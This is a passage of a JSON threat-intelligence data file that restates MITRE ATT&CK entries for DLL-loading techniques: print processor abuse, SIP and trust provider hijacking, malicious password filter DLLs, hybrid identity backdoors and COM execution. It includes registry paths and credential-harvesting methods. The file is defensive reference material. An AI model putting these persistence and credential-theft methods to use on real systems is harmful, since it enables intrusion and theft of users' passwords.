    "technique_description": "Adversaries may abuse print processors to run malicious DLLs during system boot for persistence and/or privilege escalation. Print processors are DLLs that are loaded by the print spooler service, spoolsv.exe, during boot. \n\nAdversaries may abuse the print spooler service by adding print processors that load malicious DLLs at startup. A print processor can be installed through the <code>AddPrintProcessor</code> API call with an account that has <code>SeLoadDriverPrivilege</code> enabled. Alternatively, a print processor can be registered to the print spooler service by adding the <code>HKLM\\SYSTEM\\\\[CurrentControlSet or ControlSet001]\\Control\\Print\\Environments\\\\[Windows architecture: e.g., Windows x64]\\Print Processors\\\\[user defined]\\Driver</code> Registry key that points to the DLL. For the print processor to be correctly installed, it must be located in the system print-processor directory that can be found with the <code>GetPrintProcessorDirectory</code> API call.(Citation: Microsoft AddPrintProcessor May 2018) After the print processors are installed, the print spooler service, which starts during boot, must be restarted in order for them to run.(Citation: ESET PipeMon May 2020) The print spooler service runs under SYSTEM level permissions, therefore print processors installed by an adversary may run under elevated privileges.",
    "technique_references": [
      {
        "source_name": "Microsoft AddPrintProcessor May 2018",
        "url": "https://docs.microsoft.com/en-us/windows/win32/printdocs/addprintprocessor",
        "description": "Microsoft. (2018, May 31). AddPrintProcessor function. Retrieved October 5, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "ESET PipeMon May 2020",
        "url": "https://www.welivesecurity.com/2020/05/21/no-game-over-winnti-group/",
        "description": "Tartare, M. et al. (2020, May 21). No “Game over” for the Winnti Group. Retrieved August 24, 2020.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "administrator|system",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--2de47683-f398-448f-b947-9abcc3e32fad",
    "platform": "windows",
    "tid": "T1547.012",
    "technique": "Print Processors",
    "tactic": "privilege-escalation",
    "datasources": "module-load",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "Adversaries may abuse print processors to run malicious DLLs during system boot for persistence and/or privilege escalation. Print processors are DLLs that are loaded by the print spooler service, spoolsv.exe, during boot. \n\nAdversaries may abuse the print spooler service by adding print processors that load malicious DLLs at startup. A print processor can be installed through the <code>AddPrintProcessor</code> API call with an account that has <code>SeLoadDriverPrivilege</code> enabled. Alternatively, a print processor can be registered to the print spooler service by adding the <code>HKLM\\SYSTEM\\\\[CurrentControlSet or ControlSet001]\\Control\\Print\\Environments\\\\[Windows architecture: e.g., Windows x64]\\Print Processors\\\\[user defined]\\Driver</code> Registry key that points to the DLL. For the print processor to be correctly installed, it must be located in the system print-processor directory that can be found with the <code>GetPrintProcessorDirectory</code> API call.(Citation: Microsoft AddPrintProcessor May 2018) After the print processors are installed, the print spooler service, which starts during boot, must be restarted in order for them to run.(Citation: ESET PipeMon May 2020) The print spooler service runs under SYSTEM level permissions, therefore print processors installed by an adversary may run under elevated privileges.",
    "technique_references": [
      {
        "source_name": "Microsoft AddPrintProcessor May 2018",
        "url": "https://docs.microsoft.com/en-us/windows/win32/printdocs/addprintprocessor",
        "description": "Microsoft. (2018, May 31). AddPrintProcessor function. Retrieved October 5, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "ESET PipeMon May 2020",
        "url": "https://www.welivesecurity.com/2020/05/21/no-game-over-winnti-group/",
        "description": "Tartare, M. et al. (2020, May 21). No “Game over” for the Winnti Group. Retrieved August 24, 2020.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "administrator|system",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--543fceb5-cb92-40cb-aacf-6913d4db58bc",
    "platform": "windows",
    "tid": "T1553.003",
    "technique": "SIP and Trust Provider Hijacking",
    "tactic": "defense-evasion",
    "datasources": "module-load",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "Adversaries may tamper with SIP and trust provider components to mislead the operating system and application control tools when conducting signature validation checks. In user mode, Windows Authenticode (Citation: Microsoft Authenticode) digital signatures are used to verify a file's origin and integrity, variables that may be used to establish trust in signed code (ex: a driver with a valid Microsoft signature may be handled as safe). The signature validation process is handled via the WinVerifyTrust application programming interface (API) function,  (Citation: Microsoft WinVerifyTrust) which accepts an inquiry and coordinates with the appropriate trust provider, which is responsible for validating parameters of a signature. (Citation: SpectorOps Subverting Trust Sept 2017)\n\nBecause of the varying executable file types and corresponding signature formats, Microsoft created software components called Subject Interface Packages (SIPs) (Citation: EduardosBlog SIPs July 2008) to provide a layer of abstraction between API functions and files. SIPs are responsible for enabling API functions to create, retrieve, calculate, and verify signatures. Unique SIPs exist for most file formats (Executable, PowerShell, Installer, etc., with catalog signing providing a catch-all  (Citation: Microsoft Catalog Files and Signatures April 2017)) and are identified by globally unique identifiers (GUIDs). (Citation: SpectorOps Subverting Trust Sept 2017)\n\nSimilar to [Code Signing](https://attack.mitre.org/techniques/T1553/002), adversaries may abuse this architecture to subvert trust controls and bypass security policies that allow only legitimately signed code to execute on a system. Adversaries may hijack SIP and trust provider components to mislead operating system and application control tools to classify malicious (or any) code as signed by: (Citation: SpectorOps Subverting Trust Sept 2017)\n\n* Modifying the <code>Dll</code> and <code>FuncName</code> Registry values in <code>HKLM\\SOFTWARE[\\WOW6432Node\\]Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllGetSignedDataMsg\\{SIP_GUID}</code> that point to the dynamic link library (DLL) providing a SIP’s CryptSIPDllGetSignedDataMsg function, which retrieves an encoded digital certificate from a signed file. By pointing to a maliciously-crafted DLL with an exported function that always returns a known good signature value (ex: a Microsoft signature for Portable Executables) rather than the file’s real signature, an adversary can apply an acceptable signature value to all files using that SIP (Citation: GitHub SIP POC Sept 2017) (although a hash mismatch will likely occur, invalidating the signature, since the hash returned by the function will not match the value computed from the file).\n* Modifying the <code>Dll</code> and <code>FuncName</code> Registry values in <code>HKLM\\SOFTWARE\\[WOW6432Node\\]Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllVerifyIndirectData\\{SIP_GUID}</code> that point to the DLL providing a SIP’s CryptSIPDllVerifyIndirectData function, which validates a file’s computed hash against the signed hash value. By pointing to a maliciously-crafted DLL with an exported function that always returns TRUE (indicating that the validation was successful), an adversary can successfully validate any file (with a legitimate signature) using that SIP (Citation: GitHub SIP POC Sept 2017) (with or without hijacking the previously mentioned CryptSIPDllGetSignedDataMsg function). This Registry value could also be redirected to a suitable exported function from an already present DLL, avoiding the requirement to drop and execute a new file on disk.\n* Modifying the <code>DLL</code> and <code>Function</code> Registry values in <code>HKLM\\SOFTWARE\\[WOW6432Node\\]Microsoft\\Cryptography\\Providers\\Trust\\FinalPolicy\\{trust provider GUID}</code> that point to the DLL providing a trust provider’s FinalPolicy function, which is where the decoded and parsed signature is checked and the majority of trust decisions are made. Similar to hijacking SIP’s CryptSIPDllVerifyIndirectData function, this value can be redirected to a suitable exported function from an already present DLL or a maliciously-crafted DLL (though the implementation of a trust provider is complex).\n* **Note:** The above hijacks are also possible without modifying the Registry via [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001).\n\nHijacking SIP or trust provider components can also enable persistent code execution, since these malicious components may be invoked by any application that performs code signing or signature validation. (Citation: SpectorOps Subverting Trust Sept 2017)",
    "technique_references": [
      {
        "source_name": "Entrust Enable CAPI2 Aug 2017",
        "url": "http://www.entrust.net/knowledge-base/technote.cfm?tn=8165",
        "description": "Entrust Datacard. (2017, August 16). How do I enable CAPI 2.0 logging in Windows Vista, Windows 7 and Windows 2008 Server?. Retrieved January 31, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "GitHub SIP POC Sept 2017",
        "url": "https://github.com/mattifestation/PoCSubjectInterfacePackage",
        "description": "Graeber, M. (2017, September 14). PoCSubjectInterfacePackage. Retrieved January 31, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "SpectorOps Subverting Trust Sept 2017",
        "url": "https://specterops.io/assets/resources/SpecterOps_Subverting_Trust_in_Windows.pdf",
        "description": "Graeber, M. (2017, September). Subverting Trust in Windows. Retrieved January 31, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Catalog Files and Signatures April 2017",
        "url": "https://docs.microsoft.com/windows-hardware/drivers/install/catalog-files",
        "description": "Hudek, T. (2017, April 20). Catalog Files and Digital Signatures. Retrieved January 31, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Audit Registry July 2012",
        "url": "https://docs.microsoft.com/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd941614(v=ws.10)",
        "description": "Microsoft. (2012, July 2). Audit Registry. Retrieved January 31, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Registry Auditing Aug 2016",
        "url": "https://docs.microsoft.com/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn311461(v=ws.11)",
        "description": "Microsoft. (2016, August 31). Registry (Global Object Access Auditing). Retrieved January 31, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Authenticode",
        "url": "https://msdn.microsoft.com/library/ms537359.aspx",
        "description": "Microsoft. (n.d.). Authenticode. Retrieved January 31, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft WinVerifyTrust",
        "url": "https://msdn.microsoft.com/library/windows/desktop/aa388208.aspx",
        "description": "Microsoft. (n.d.). WinVerifyTrust function. Retrieved January 31, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "EduardosBlog SIPs July 2008",
        "url": "https://blogs.technet.microsoft.com/eduardonavarro/2008/07/11/sips-subject-interface-package-and-authenticode/",
        "description": "Navarro, E. (2008, July 11). SIP’s (Subject Interface Package) and Authenticode. Retrieved January 31, 2018.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--3731fbcd-0e43-47ae-ae6c-d15e510f0d42",
    "platform": "windows",
    "tid": "T1556.002",
    "technique": "Password Filter DLL",
    "tactic": "credential-access",
    "datasources": "module-load",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "Adversaries may register malicious password filter dynamic link libraries (DLLs) into the authentication process to acquire user credentials as they are validated. \n\nWindows password filters are password policy enforcement mechanisms for both domain and local accounts. Filters are implemented as DLLs containing a method to validate potential passwords against password policies. Filter DLLs can be positioned on local computers for local accounts and/or domain controllers for domain accounts. Before registering new passwords in the Security Accounts Manager (SAM), the Local Security Authority (LSA) requests validation from each registered filter. Any potential changes cannot take effect until every registered filter acknowledges validation. \n\nAdversaries can register malicious password filters to harvest credentials from local computers and/or entire domains. To perform proper validation, filters must receive plain-text credentials from the LSA. A malicious password filter would receive these plain-text credentials every time a password request is made.(Citation: Carnal Ownage Password Filters Sept 2013)",
    "technique_references": [
      {
        "source_name": "Carnal Ownage Password Filters Sept 2013",
        "url": "http://carnal0wnage.attackresearch.com/2013/09/stealing-passwords-every-time-they.html",
        "description": "Fuller, R. (2013, September 11). Stealing passwords every time they change. Retrieved November 21, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Clymb3r Function Hook Passwords Sept 2013",
        "url": "https://clymb3r.wordpress.com/2013/09/15/intercepting-password-changes-with-function-hooking/",
        "description": "Bialek, J. (2013, September 15). Intercepting Password Changes With Function Hooking. Retrieved November 21, 2017.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "administrator|system",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--3731fbcd-0e43-47ae-ae6c-d15e510f0d42",
    "platform": "windows",
    "tid": "T1556.002",
    "technique": "Password Filter DLL",
    "tactic": "defense-evasion",
    "datasources": "module-load",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "Adversaries may register malicious password filter dynamic link libraries (DLLs) into the authentication process to acquire user credentials as they are validated. \n\nWindows password filters are password policy enforcement mechanisms for both domain and local accounts. Filters are implemented as DLLs containing a method to validate potential passwords against password policies. Filter DLLs can be positioned on local computers for local accounts and/or domain controllers for domain accounts. Before registering new passwords in the Security Accounts Manager (SAM), the Local Security Authority (LSA) requests validation from each registered filter. Any potential changes cannot take effect until every registered filter acknowledges validation. \n\nAdversaries can register malicious password filters to harvest credentials from local computers and/or entire domains. To perform proper validation, filters must receive plain-text credentials from the LSA. A malicious password filter would receive these plain-text credentials every time a password request is made.(Citation: Carnal Ownage Password Filters Sept 2013)",
    "technique_references": [
      {
        "source_name": "Carnal Ownage Password Filters Sept 2013",
        "url": "http://carnal0wnage.attackresearch.com/2013/09/stealing-passwords-every-time-they.html",
        "description": "Fuller, R. (2013, September 11). Stealing passwords every time they change. Retrieved November 21, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Clymb3r Function Hook Passwords Sept 2013",
        "url": "https://clymb3r.wordpress.com/2013/09/15/intercepting-password-changes-with-function-hooking/",
        "description": "Bialek, J. (2013, September 15). Intercepting Password Changes With Function Hooking. Retrieved November 21, 2017.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "administrator|system",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--3731fbcd-0e43-47ae-ae6c-d15e510f0d42",
    "platform": "windows",
    "tid": "T1556.002",
    "technique": "Password Filter DLL",
    "tactic": "persistence",
    "datasources": "module-load",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "Adversaries may register malicious password filter dynamic link libraries (DLLs) into the authentication process to acquire user credentials as they are validated. \n\nWindows password filters are password policy enforcement mechanisms for both domain and local accounts. Filters are implemented as DLLs containing a method to validate potential passwords against password policies. Filter DLLs can be positioned on local computers for local accounts and/or domain controllers for domain accounts. Before registering new passwords in the Security Accounts Manager (SAM), the Local Security Authority (LSA) requests validation from each registered filter. Any potential changes cannot take effect until every registered filter acknowledges validation. \n\nAdversaries can register malicious password filters to harvest credentials from local computers and/or entire domains. To perform proper validation, filters must receive plain-text credentials from the LSA. A malicious password filter would receive these plain-text credentials every time a password request is made.(Citation: Carnal Ownage Password Filters Sept 2013)",
    "technique_references": [
      {
        "source_name": "Carnal Ownage Password Filters Sept 2013",
        "url": "http://carnal0wnage.attackresearch.com/2013/09/stealing-passwords-every-time-they.html",
        "description": "Fuller, R. (2013, September 11). Stealing passwords every time they change. Retrieved November 21, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Clymb3r Function Hook Passwords Sept 2013",
        "url": "https://clymb3r.wordpress.com/2013/09/15/intercepting-password-changes-with-function-hooking/",
        "description": "Bialek, J. (2013, September 15). Intercepting Password Changes With Function Hooking. Retrieved November 21, 2017.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "administrator|system",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--54ca26f3-c172-4231-93e5-ccebcac2161f",
    "platform": "windows|azure-ad|saas|google-workspace|office-365|iaas",
    "tid": "T1556.007",
    "technique": "Hybrid Identity",
    "tactic": "credential-access",
    "datasources": "module-load",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "Adversaries may patch, modify, or otherwise backdoor cloud authentication processes that are tied to on-premises user identities in order to bypass typical authentication mechanisms, access credentials, and enable persistent access to accounts.  \n\nMany organizations maintain hybrid user and device identities that are shared between on-premises and cloud-based environments. These can be maintained in a number of ways. For example, Azure AD includes three options for synchronizing identities between Active Directory and Azure AD(Citation: Azure AD Hybrid Identity):\n\n* Password Hash Synchronization (PHS), in which a privileged on-premises account synchronizes user password hashes between Active Directory and Azure AD, allowing authentication to Azure AD to take place entirely in the cloud \n* Pass Through Authentication (PTA), in which Azure AD authentication attempts are forwarded to an on-premises PTA agent, which validates the credentials against Active Directory \n* Active Directory Federation Services (AD FS), in which a trust relationship is established between Active Directory and Azure AD \n\nAD FS can also be used with other SaaS and cloud platforms such as AWS and GCP, which will hand off the authentication process to AD FS and receive a token containing the hybrid users’ identity and privileges. \n\nBy modifying authentication processes tied to hybrid identities, an adversary may be able to establish persistent privileged access to cloud resources. For example, adversaries who compromise an on-premises server running a PTA agent may inject a malicious DLL into the `AzureADConnectAuthenticationAgentService` process that authorizes all attempts to authenticate to Azure AD, as well as records user credentials.(Citation: Azure AD Connect for Read Teamers)(Citation: AADInternals Azure AD On-Prem to Cloud) In environments using AD FS, an adversary may edit the `Microsoft.IdentityServer.Servicehost` configuration file to load a malicious DLL that generates authentication tokens for any user with any set of claims, thereby bypassing multi-factor authentication and defined AD FS policies.(Citation: MagicWeb)\n\nIn some cases, adversaries may be able to modify the hybrid identity authentication process from the cloud. For example, adversaries who compromise a Global Administrator account in an Azure AD tenant may be able to register a new PTA agent via the web console, similarly allowing them to harvest credentials and log into the Azure AD environment as any user.(Citation: Mandiant Azure AD Backdoors)",
    "technique_references": [
      {
        "source_name": "Azure AD Connect for Read Teamers",
        "url": "https://blog.xpnsec.com/azuread-connect-for-redteam/",
        "description": "Adam Chester. (2019, February 18). Azure AD Connect for Red Teamers. Retrieved September 28, 2022.",
        "external_id": "none"
      },
      {
        "source_name": "AADInternals Azure AD On-Prem to Cloud",
        "url": "https://o365blog.com/post/on-prem_admin/",
        "description": "Dr. Nestori Syynimaa. (2020, July 13). Unnoticed sidekick: Getting access to cloud as an on-prem admin. Retrieved September 28, 2022.",
        "external_id": "none"
      },
      {
        "source_name": "MagicWeb",
        "url": "https://www.microsoft.com/security/blog/2022/08/24/magicweb-nobeliums-post-compromise-trick-to-authenticate-as-anyone/",
        "description": "Microsoft Threat Intelligence Center, Microsoft Detection and Response Team, Microsoft 365 Defender Research Team . (2022, August 24). MagicWeb: NOBELIUM’s post-compromise trick to authenticate as anyone. Retrieved September 28, 2022.",
        "external_id": "none"
      },
      {
        "source_name": "Azure AD Hybrid Identity",
        "url": "https://learn.microsoft.com/en-us/azure/active-directory/hybrid/choose-ad-authn",
        "description": "Microsoft. (2022, August 26). Choose the right authentication method for your Azure Active Directory hybrid identity solution. Retrieved September 28, 2022.",
        "external_id": "none"
      },
      {
        "source_name": "Mandiant Azure AD Backdoors",
        "url": "https://www.mandiant.com/resources/detecting-microsoft-365-azure-active-directory-backdoors",
        "description": "Mike Burns. (2020, September 30). Detecting Microsoft 365 and Azure Active Directory Backdoors. Retrieved September 28, 2022.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--54ca26f3-c172-4231-93e5-ccebcac2161f",
    "platform": "windows|azure-ad|saas|google-workspace|office-365|iaas",
    "tid": "T1556.007",
    "technique": "Hybrid Identity",
    "tactic": "defense-evasion",
    "datasources": "module-load",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "Adversaries may patch, modify, or otherwise backdoor cloud authentication processes that are tied to on-premises user identities in order to bypass typical authentication mechanisms, access credentials, and enable persistent access to accounts.  \n\nMany organizations maintain hybrid user and device identities that are shared between on-premises and cloud-based environments. These can be maintained in a number of ways. For example, Azure AD includes three options for synchronizing identities between Active Directory and Azure AD(Citation: Azure AD Hybrid Identity):\n\n* Password Hash Synchronization (PHS), in which a privileged on-premises account synchronizes user password hashes between Active Directory and Azure AD, allowing authentication to Azure AD to take place entirely in the cloud \n* Pass Through Authentication (PTA), in which Azure AD authentication attempts are forwarded to an on-premises PTA agent, which validates the credentials against Active Directory \n* Active Directory Federation Services (AD FS), in which a trust relationship is established between Active Directory and Azure AD \n\nAD FS can also be used with other SaaS and cloud platforms such as AWS and GCP, which will hand off the authentication process to AD FS and receive a token containing the hybrid users’ identity and privileges. \n\nBy modifying authentication processes tied to hybrid identities, an adversary may be able to establish persistent privileged access to cloud resources. For example, adversaries who compromise an on-premises server running a PTA agent may inject a malicious DLL into the `AzureADConnectAuthenticationAgentService` process that authorizes all attempts to authenticate to Azure AD, as well as records user credentials.(Citation: Azure AD Connect for Read Teamers)(Citation: AADInternals Azure AD On-Prem to Cloud) In environments using AD FS, an adversary may edit the `Microsoft.IdentityServer.Servicehost` configuration file to load a malicious DLL that generates authentication tokens for any user with any set of claims, thereby bypassing multi-factor authentication and defined AD FS policies.(Citation: MagicWeb)\n\nIn some cases, adversaries may be able to modify the hybrid identity authentication process from the cloud. For example, adversaries who compromise a Global Administrator account in an Azure AD tenant may be able to register a new PTA agent via the web console, similarly allowing them to harvest credentials and log into the Azure AD environment as any user.(Citation: Mandiant Azure AD Backdoors)",
    "technique_references": [
      {
        "source_name": "Azure AD Connect for Read Teamers",
        "url": "https://blog.xpnsec.com/azuread-connect-for-redteam/",
        "description": "Adam Chester. (2019, February 18). Azure AD Connect for Red Teamers. Retrieved September 28, 2022.",
        "external_id": "none"
      },
      {
        "source_name": "AADInternals Azure AD On-Prem to Cloud",
        "url": "https://o365blog.com/post/on-prem_admin/",
        "description": "Dr. Nestori Syynimaa. (2020, July 13). Unnoticed sidekick: Getting access to cloud as an on-prem admin. Retrieved September 28, 2022.",
        "external_id": "none"
      },
      {
        "source_name": "MagicWeb",
        "url": "https://www.microsoft.com/security/blog/2022/08/24/magicweb-nobeliums-post-compromise-trick-to-authenticate-as-anyone/",
        "description": "Microsoft Threat Intelligence Center, Microsoft Detection and Response Team, Microsoft 365 Defender Research Team . (2022, August 24). MagicWeb: NOBELIUM’s post-compromise trick to authenticate as anyone. Retrieved September 28, 2022.",
        "external_id": "none"
      },
      {
        "source_name": "Azure AD Hybrid Identity",
        "url": "https://learn.microsoft.com/en-us/azure/active-directory/hybrid/choose-ad-authn",
        "description": "Microsoft. (2022, August 26). Choose the right authentication method for your Azure Active Directory hybrid identity solution. Retrieved September 28, 2022.",
        "external_id": "none"
      },
      {
        "source_name": "Mandiant Azure AD Backdoors",
        "url": "https://www.mandiant.com/resources/detecting-microsoft-365-azure-active-directory-backdoors",
        "description": "Mike Burns. (2020, September 30). Detecting Microsoft 365 and Azure Active Directory Backdoors. Retrieved September 28, 2022.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--54ca26f3-c172-4231-93e5-ccebcac2161f",
    "platform": "windows|azure-ad|saas|google-workspace|office-365|iaas",
    "tid": "T1556.007",
    "technique": "Hybrid Identity",
    "tactic": "persistence",
    "datasources": "module-load",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "Adversaries may patch, modify, or otherwise backdoor cloud authentication processes that are tied to on-premises user identities in order to bypass typical authentication mechanisms, access credentials, and enable persistent access to accounts.  \n\nMany organizations maintain hybrid user and device identities that are shared between on-premises and cloud-based environments. These can be maintained in a number of ways. For example, Azure AD includes three options for synchronizing identities between Active Directory and Azure AD(Citation: Azure AD Hybrid Identity):\n\n* Password Hash Synchronization (PHS), in which a privileged on-premises account synchronizes user password hashes between Active Directory and Azure AD, allowing authentication to Azure AD to take place entirely in the cloud \n* Pass Through Authentication (PTA), in which Azure AD authentication attempts are forwarded to an on-premises PTA agent, which validates the credentials against Active Directory \n* Active Directory Federation Services (AD FS), in which a trust relationship is established between Active Directory and Azure AD \n\nAD FS can also be used with other SaaS and cloud platforms such as AWS and GCP, which will hand off the authentication process to AD FS and receive a token containing the hybrid users’ identity and privileges. \n\nBy modifying authentication processes tied to hybrid identities, an adversary may be able to establish persistent privileged access to cloud resources. For example, adversaries who compromise an on-premises server running a PTA agent may inject a malicious DLL into the `AzureADConnectAuthenticationAgentService` process that authorizes all attempts to authenticate to Azure AD, as well as records user credentials.(Citation: Azure AD Connect for Read Teamers)(Citation: AADInternals Azure AD On-Prem to Cloud) In environments using AD FS, an adversary may edit the `Microsoft.IdentityServer.Servicehost` configuration file to load a malicious DLL that generates authentication tokens for any user with any set of claims, thereby bypassing multi-factor authentication and defined AD FS policies.(Citation: MagicWeb)\n\nIn some cases, adversaries may be able to modify the hybrid identity authentication process from the cloud. For example, adversaries who compromise a Global Administrator account in an Azure AD tenant may be able to register a new PTA agent via the web console, similarly allowing them to harvest credentials and log into the Azure AD environment as any user.(Citation: Mandiant Azure AD Backdoors)",
    "technique_references": [
      {
        "source_name": "Azure AD Connect for Read Teamers",
        "url": "https://blog.xpnsec.com/azuread-connect-for-redteam/",
        "description": "Adam Chester. (2019, February 18). Azure AD Connect for Red Teamers. Retrieved September 28, 2022.",
        "external_id": "none"
      },
      {
        "source_name": "AADInternals Azure AD On-Prem to Cloud",
        "url": "https://o365blog.com/post/on-prem_admin/",
        "description": "Dr. Nestori Syynimaa. (2020, July 13). Unnoticed sidekick: Getting access to cloud as an on-prem admin. Retrieved September 28, 2022.",
        "external_id": "none"
      },
      {
        "source_name": "MagicWeb",
        "url": "https://www.microsoft.com/security/blog/2022/08/24/magicweb-nobeliums-post-compromise-trick-to-authenticate-as-anyone/",
        "description": "Microsoft Threat Intelligence Center, Microsoft Detection and Response Team, Microsoft 365 Defender Research Team . (2022, August 24). MagicWeb: NOBELIUM’s post-compromise trick to authenticate as anyone. Retrieved September 28, 2022.",
        "external_id": "none"
      },
      {
        "source_name": "Azure AD Hybrid Identity",
        "url": "https://learn.microsoft.com/en-us/azure/active-directory/hybrid/choose-ad-authn",
        "description": "Microsoft. (2022, August 26). Choose the right authentication method for your Azure Active Directory hybrid identity solution. Retrieved September 28, 2022.",
        "external_id": "none"
      },
      {
        "source_name": "Mandiant Azure AD Backdoors",
        "url": "https://www.mandiant.com/resources/detecting-microsoft-365-azure-active-directory-backdoors",
        "description": "Mike Burns. (2020, September 30). Detecting Microsoft 365 and Azure Active Directory Backdoors. Retrieved September 28, 2022.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--2f6b4ed7-fef1-44ba-bcb8-1b4beb610b64",
    "platform": "windows",
    "tid": "T1559.001",
    "technique": "Component Object Model",
    "tactic": "execution",
    "datasources": "module-load",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "Adversaries may use the Windows Component Object Model (COM) for local code execution. COM is an inter-process communication (IPC) component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces.(Citation: Fireeye Hunting COM June 2019) Through COM, a client object can call methods of server objects, which are typically binary Dynamic Link Libraries (DLL) or executables (EXE).(Citation: Microsoft COM) Remote COM execution is facilitated by [Remote Services](https://attack.mitre.org/techniques/T1021) such as  [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) (DCOM).(Citation: Fireeye Hunting COM June 2019)\n\nVarious COM interfaces are exposed that can be abused to invoke arbitrary execution via a variety of programming languages such as C, C++, Java, and [Visual Basic](https://attack.mitre.org/techniques/T1059/005).(Citation: Microsoft COM) Specific COM objects also exist to directly perform functions beyond code execution, such as creating a [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), fileless download/execution, and other adversary behaviors related to privilege escalation and persistence.(Citation: Fireeye Hunting COM June 2019)(Citation: ProjectZero File Write EoP Apr 2018)",
    "technique_references": [
      {
        "source_name": "Fireeye Hunting COM June 2019",
        "url": "https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html",
        "description": "Hamilton, C. (2019, June 4). Hunting COM Objects. Retrieved June 10, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft COM",
        "url": "https://msdn.microsoft.com/library/windows/desktop/ms680573.aspx",
        "description": "Microsoft. (n.d.). Component Object Model (COM). Retrieved November 22, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "ProjectZero File Write EoP Apr 2018",
        "url": "https://googleprojectzero.blogspot.com/2018/04/windows-exploitation-tricks-exploiting.html",
        "description": "Forshaw, J. (2018, April 18). Windows Exploitation Tricks: Exploiting Arbitrary File Writes for Local Elevation of Privilege. Retrieved May 3, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Enigma Outlook DCOM Lateral Movement Nov 2017",
        "url": "https://enigma0x3.net/2017/11/16/lateral-movement-using-outlooks-createobject-method-and-dotnettojscript/",
        "description": "Nelson, M. (2017, November 16). Lateral Movement using Outlook's CreateObject Method and DotNetToJScript. Retrieved November 21, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Enigma MMC20 COM Jan 2017",
        "url": "https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/",
        "description": "Nelson, M. (2017, January 5). Lateral Movement using the MMC20 Application COM Object. Retrieved November 21, 2017.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "none",
